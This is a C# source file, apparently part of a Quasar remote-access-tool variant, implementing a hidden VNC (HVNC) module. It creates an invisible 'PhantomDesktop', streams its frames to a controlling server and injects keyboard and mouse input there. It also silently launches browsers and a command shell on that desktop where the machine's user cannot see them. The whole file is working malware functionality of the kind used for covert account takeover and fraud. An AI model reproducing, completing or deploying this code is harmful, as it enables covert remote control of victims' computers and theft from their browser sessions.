using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using Quasar.Client.Helper;
using Quasar.Client.Helper.HVNC;
using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Messages.Monitoring.HVNC;
using Quasar.Common.Messages.other;
using Quasar.Common.Networking;
using Quasar.Common.Video;
using Quasar.Common.Video.Codecs;

namespace Quasar.Client.Messages
{
    public class HVNCHandler : IMessageProcessor, IDisposable
    {
        private UnsafeStreamCodec _streamCodec;
        private BitmapData _desktopData = null;
        private Bitmap _desktop = null;
        private ISender _clientMain;
        private Thread _captureThread;
        private CancellationTokenSource _cancellationTokenSource;

        private readonly ImageHandler ImageHandler = new ImageHandler("PhantomDesktop");
        private readonly InputHandler InputHandler = new InputHandler("PhantomDesktop");
        private readonly ProcessController ProcessHandler = new ProcessController("PhantomDesktop");

        // frame control variables
        private readonly ConcurrentQueue<byte[]> _frameBuffer = new ConcurrentQueue<byte[]>();
        private readonly AutoResetEvent _frameRequestEvent = new AutoResetEvent(false);
        private int _pendingFrameRequests = 0;

        // max buffer size to prevent memory issues
        private const int MAX_BUFFER_SIZE = 10;

        private readonly Stopwatch _stopwatch = new Stopwatch();

        public bool CanExecute(IMessage message)
        {
            return message is GetHVNCDesktop || message is DoHVNCInput || message is StartHVNCProcess;
        }

        public bool CanExecuteFrom(ISender sender)
        {
            return true;
        }

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetHVNCDesktop getDesktop:
                    Execute(sender, getDesktop);
                    break;
                case DoHVNCInput doInput:
                    InputHandler.Input(doInput.msg, (IntPtr)doInput.wParam, (IntPtr)doInput.lParam);
                    break;
                case StartHVNCProcess startHVNCProcess:
                    Execute(sender, startHVNCProcess);
                    break;
            }
        }

        private void Execute(ISender client, GetHVNCDesktop message)
        {
            if (message.Status == RemoteDesktopStatus.Stop)
            {
                StopScreenStreaming();
            }
            else if (message.Status == RemoteDesktopStatus.Start)
            {
                StartScreenStreaming(client, message);
            }
            else if (message.Status == RemoteDesktopStatus.Continue)
            {
                Interlocked.Add(ref _pendingFrameRequests, message.FramesRequested);
                _frameRequestEvent.Set();
            }
        }

        private void StartScreenStreaming(ISender client, GetHVNCDesktop message)
        {
            var monitorBounds = ScreenHelperCPU.GetBounds(message.DisplayIndex);
            var resolution = new Resolution { Height = monitorBounds.Height, Width = monitorBounds.Width };

            if (_streamCodec == null)
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);

            if (message.CreateNew)
            {
                _streamCodec?.Dispose();
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
            }

            if (_streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
            {
                _streamCodec?.Dispose();
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
            }

            _clientMain = client;

            ClearFrameBuffer();
            Interlocked.Exchange(ref _pendingFrameRequests, message.FramesRequested);

            if (_captureThread == null || !_captureThread.IsAlive)
            {
                _cancellationTokenSource = new CancellationTokenSource();
                _captureThread = new Thread(() => BufferedCaptureLoop(_cancellationTokenSource.Token));
                _captureThread.Start();
            }
        }

        private void StopScreenStreaming()
        {
            _cancellationTokenSource?.Cancel();

            if (_captureThread != null && _captureThread.IsAlive)
            {
                _frameRequestEvent.Set();
                _captureThread.Join();
                _captureThread = null;
            }

            if (_desktop != null)
            {
                if (_desktopData != null)
                {
                    try
                    {
                        _desktop.UnlockBits(_desktopData);
                    }
                    catch
                    {
                    }
                    _desktopData = null;
                }
                _desktop.Dispose();
                _desktop = null;
            }

            if (_streamCodec != null)
            {
                _streamCodec.Dispose();
                _streamCodec = null;
            }

            ClearFrameBuffer();
            Interlocked.Exchange(ref _pendingFrameRequests, 0);
        }

        private void BufferedCaptureLoop(CancellationToken cancellationToken)
        {
            _stopwatch.Start();

            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    if (_frameBuffer.Count >= MAX_BUFFER_SIZE || _pendingFrameRequests <= 0)
                    {
                        _frameRequestEvent.WaitOne(500);

                        if (cancellationToken.IsCancellationRequested)
                            break;

                        continue;
                    }

                    byte[] frameData = CaptureFrame();
                    if (frameData != null)
                    {
                        _frameBuffer.Enqueue(frameData);

                        if (_stopwatch.ElapsedMilliseconds >= 1000)
                        {
                            _stopwatch.Restart();
                        }
                    }

                    while (_pendingFrameRequests > 0 && _frameBuffer.TryDequeue(out byte[] frameToSend))
                    {
                        SendFrameToServer(frameToSend, Interlocked.Decrement(ref _pendingFrameRequests) == 0);
                    }
                }
                catch (Exception ex)
                {
                    Thread.Sleep(100);
                }
            }
        }

        private byte[] CaptureFrame()
        {
            try
            {
                _desktop = ImageHandler.Screenshot();

                if (_desktop == null)
                {
                    return null;
                }

                _desktopData = _desktop.LockBits(new Rectangle(0, 0, _desktop.Width, _desktop.Height),
                    ImageLockMode.ReadWrite, _desktop.PixelFormat);

                using (MemoryStream stream = new MemoryStream())
                {
                    if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
                    _streamCodec.CodeImage(_desktopData.Scan0,
                        new Rectangle(0, 0, _desktop.Width, _desktop.Height),
                        new Size(_desktop.Width, _desktop.Height),
                        _desktop.PixelFormat, stream);

                    return stream.ToArray();
                }
            }
            catch (Exception)
            {
                return null;
            }
            finally
            {
                if (_desktopData != null)
                {
                    _desktop.UnlockBits(_desktopData);
                    _desktopData = null;
                }
                _desktop?.Dispose();
                _desktop = null;
            }
        }

        private void SendFrameToServer(byte[] frameData, bool isLastRequestedFrame)
        {
            if (frameData == null || _clientMain == null) return;

            try
            {
                _clientMain.Send(new GetHVNCDesktopResponse
                {
                    Image = frameData,
                    Quality = _streamCodec.ImageQuality,
                    Monitor = _streamCodec.Monitor,
                    Resolution = _streamCodec.Resolution,
                    Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
                    IsLastRequestedFrame = isLastRequestedFrame
                });
            }
            catch (Exception)
            {
            }
        }

        private void ClearFrameBuffer()
        {
            while (_frameBuffer.TryDequeue(out _)) { }
        }

        private void Execute(ISender client, StartHVNCProcess message)
        {
            string name = message.Application;
            if (name == "Chrome")
            {
                this.ProcessHandler.Startchrome();
                return;
            }
            if (name == "Explorer")
            {
                this.ProcessHandler.StartExplorer();
                return;
            }
            if (name == "Cmd")
            {
                this.ProcessHandler.CreateProc("cmd");
                return;
            }
            if (name == "Edge")
            {
                this.ProcessHandler.StartEdge();
                return;
            }
            if (name == "Brave")
            {
                this.ProcessHandler.StartBrave();
                return;
            }
            if (name == "Opera")
            {
                this.ProcessHandler.StartOpera();
                return;
            }
            if (!(name == "Mozilla"))
            {
                return;
            }
            this.ProcessHandler.StartFirefox();
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                Debug.WriteLine("HVNC Handler Disposed");
                StopScreenStreaming();
                ImageHandler.Dispose();
                InputHandler.Dispose();
                _streamCodec?.Dispose();
                _cancellationTokenSource?.Dispose();
                _frameRequestEvent?.Dispose();
            }
        }
    }
}
